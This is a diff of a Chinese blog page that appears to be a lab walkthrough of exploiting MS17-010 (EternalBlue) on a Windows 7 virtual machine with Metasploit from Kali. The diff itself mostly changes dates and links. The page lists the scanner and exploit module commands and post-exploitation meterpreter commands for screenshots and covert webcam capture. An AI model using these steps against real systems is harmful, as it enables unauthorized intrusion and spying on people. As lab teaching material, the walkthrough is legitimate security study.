@@ -33,6 +33,7 @@
 
   
 
+<link rel="alternate" href="/atom.xml" title="Shmily-ing" type="application/atom+xml">
 </head>
 
 </html>
@@ -65,8 +66,8 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/" class="article-date">
-  <time datetime="2020-09-27T07:09:07.110Z" itemprop="datePublished">2020-09-27</time>
+      <a href="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/" class="article-date">
+  <time datetime="2022-06-13T12:04:03.718Z" itemprop="datePublished">2022-06-13</time>
 </a> 
   <div class="article-category">
     <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/">渗透</a>
@@ -105,23 +106,23 @@
 <h3 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h3><p>渗透机kali      ip:192.168.119.138</p>
 <p>靶机 win7-2    ip:192.168.119.132</p>
 <p>子网掩码：255.255.255.0</p>
-<span id="more"></span>
+<a id="more"></a>
 
-<h3 id="测试能否ping通"><a href="#测试能否ping通" class="headerlink" title="测试能否ping通"></a>测试能否ping通</h3><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193858120.png" alt="image-20200926193858120">
+<h3 id="测试能否ping通"><a href="#测试能否ping通" class="headerlink" title="测试能否ping通"></a>测试能否ping通</h3><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193858120.png" alt="image-20200926193858120">
 
 <p>​       </p>
-<img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193926874.png" alt="image-20200926193926874">
+<img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926193926874.png" alt="image-20200926193926874">
 
 <p>ok 可以</p>
 <hr>
 <ul>
 <li>kali打开 msfconsole</li>
 </ul>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926194608129.png" alt="image-20200926194608129"></p>
+<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926194608129.png" alt="image-20200926194608129"></p>
 <ul>
 <li>输入search ms17_010</li>
 </ul>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926195212894.png" alt="image-20200926195212894"></p>
+<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926195212894.png" alt="image-20200926195212894"></p>
 <p><code>auxiliary/scanner/smb/smb_ms17_010</code>             为扫描模板</p>
 <p><code>exploit/windows/smb/ms17_010_eternalblue</code>为攻击模板</p>
 <h3 id="扫描是否存在该漏洞"><a href="#扫描是否存在该漏洞" class="headerlink" title="扫描是否存在该漏洞"></a>扫描是否存在该漏洞</h3><blockquote>
@@ -131,7 +132,7 @@
 <p>set threads     20                                                             #设置线程，加快扫描</p>
 <p>run</p>
 </blockquote>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926201345760.png" alt="image-20200926201345760"></p>
+<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926201345760.png" alt="image-20200926201345760"></p>
 <p>我们可以发现存在漏洞的地方</p>
 <hr>
 <h3 id="运用攻击模块"><a href="#运用攻击模块" class="headerlink" title="运用攻击模块"></a>运用攻击模块</h3><blockquote>
@@ -141,8 +142,8 @@
 <p>set lhost 192.168.119.138</p>
 <p>exploit</p>
 </blockquote>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205215563.png" alt="image-20200926205215563"></p>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205307084.png" alt="image-20200926205307084"></p>
+<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205215563.png" alt="image-20200926205215563"></p>
+<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926205307084.png" alt="image-20200926205307084"></p>
 <p>成功监听了。</p>
 <hr>
 <h3 id="干点坏事了-嘿嘿"><a href="#干点坏事了-嘿嘿" class="headerlink" title="干点坏事了~_ ~嘿嘿"></a>干点坏事了~_ ~嘿嘿</h3><blockquote>
@@ -150,8 +151,8 @@
 <p>getuid    查看用户身份</p>
 <p>screenshot  对远程主机当前屏幕进行截图</p>
 </blockquote>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926210803367.png" alt="image-20200926210803367"></p>
-<p><img src="/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926211000376.png" alt="image-20200926211000376"></p>
+<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926210803367.png" alt="image-20200926210803367"></p>
+<p><img src="/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/image-20200926211000376.png" alt="image-20200926211000376"></p>
 <blockquote>
 <p>webcam_list 查看有没有摄像头  ,webcam_stream 打开摄像头。虚拟机一般情况下没有摄像头，除非自己设置</p>
 <p>webcam_snap 拍照</p>
@@ -220,7 +221,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2020/09/27/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/06/13/2020-9-26MSF-%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%85%A5%E4%BE%B5/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -233,19 +234,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-10-17/" class="article-nav-link">
+      <a href="/2022/06/13/2020-9-27buuctf/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            西湖论剑web复现
+            BUU- [GWCTF 2019]
           
         </div>
       </a>
     
     
-      <a href="/2020/09/27/2020-9-27buuctf/" class="article-nav-link">
+      <a href="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">BUU- [GWCTF 2019]</div>
+        <div class="article-nav-title">php反序列化</div>
       </a>
     
   </nav>
